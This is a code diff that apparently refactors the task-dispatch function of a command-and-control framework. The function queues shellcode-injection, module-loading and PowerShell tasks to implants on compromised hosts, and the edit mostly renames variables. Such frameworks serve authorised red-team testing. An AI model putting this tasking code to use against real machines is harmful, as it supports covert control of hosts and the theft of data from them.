@@ -11,19 +11,19 @@ else:
 
 
 def newTask(path):
-    result = DB.get_implants_all()
+    all_implants = DB.get_implants_all()
     commands = ""
-    if result:
-        for i in result:
-            RandomURI = i[1]
-            EncKey = i[5]
+    if all_implants:
+        for i in all_implants:
+            RandomURI = i.RandomURI
+            EncKey = i.Key
             tasks = DB.get_newtasks(RandomURI)
             if RandomURI in path and tasks:
-                for a in tasks:
-                    command = a[2]
-                    user = a[3]
+                for task in tasks:
+                    command = task[2]
+                    user = task[3]
                     user_command = command
-                    hostinfo = DB.get_hostinfo(RandomURI)
+                    implant = DB.get_implantbyrandomuri(RandomURI)
                     implant_type = DB.get_implanttype(RandomURI)
                     now = datetime.datetime.now()
                     if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")):
@@ -44,7 +44,7 @@ def newTask(path):
                             upload_file_bytes = f.read()
                         if not upload_file_bytes:
                             print(Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
-                            DB.del_newtasks(str(a[0]))
+                            DB.del_newtasks(str(task[0]))
                             continue
                         upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
                         if implant_type.lower().startswith('c#'):
@@ -65,9 +65,9 @@ def newTask(path):
                         raise ValueError('Task ID is greater than 5 characters which is not supported.')
                     print(Colours.YELLOW)
                     if user is not None and user != "":
-                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
+                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                     else:
-                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
+                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                     try:
                         if (user_command.lower().startswith("run-exe sharpwmi.program sharpwmi action=execute")):
                             print(user_command[0:200])
@@ -76,9 +76,9 @@ def newTask(path):
                         print(Colours.END)
                     except Exception as e:
                         print("Cannot print output: %s" % e)
-                    if a[2].startswith("loadmodule "):
+                    if task[2].startswith("loadmodule "):
                         try:
-                            module_name = (a[2]).replace("loadmodule ", "")
+                            module_name = (task[2]).replace("loadmodule ", "")
                             if ".exe" in module_name:
                                 modulestr = load_module_sharp(module_name)
                             elif ".dll" in module_name:
@@ -89,18 +89,18 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
-                    elif a[2].startswith("run-exe Program PS "):
+                    elif task[2].startswith("run-exe Program PS "):
                         try:
-                            cmd = (a[2]).replace("run-exe Program PS ", "")
+                            cmd = (task[2]).replace("run-exe Program PS ", "")
                             modulestr = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
                             command = "run-exe Program PS %s" % modulestr
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
                             traceback.print_exc()
-                    elif a[2].startswith("pslo "):
+                    elif task[2].startswith("pslo "):
                         try:
-                            module_name = (a[2]).replace("pslo ", "")
+                            module_name = (task[2]).replace("pslo ", "")
                             for modname in os.listdir(ModulesDirectory):
                                 if modname.lower() in module_name.lower():
                                     module_name = modname
@@ -110,9 +110,9 @@ def newTask(path):
                             print("Cannot find module, loadmodule is case sensitive!")
                             print(e)
                             traceback.print_exc()
-                    elif a[2].startswith("pbind-loadmodule"):
+                    elif task[2].startswith("pbind-loadmodule"):
                         try:
-                            module_name = (a[2]).replace("pbind-loadmodule ", "")
+                            module_name = (task[2]).replace("pbind-loadmodule ", "")
                             if ".exe" in module_name:
                                 modulestr = load_module_sharp(module_name)
                             elif ".dll" in module_name:
@@ -134,7 +134,7 @@ def newTask(path):
                         commands += "!d-3dion@LD!-d" + command
                     else:
                         commands += command
-                    DB.del_newtasks(str(a[0]))
+                    DB.del_newtasks(str(task[0]))
                 if commands is not None:
                     multicmd = "multicmd%s" % commands
                 try:
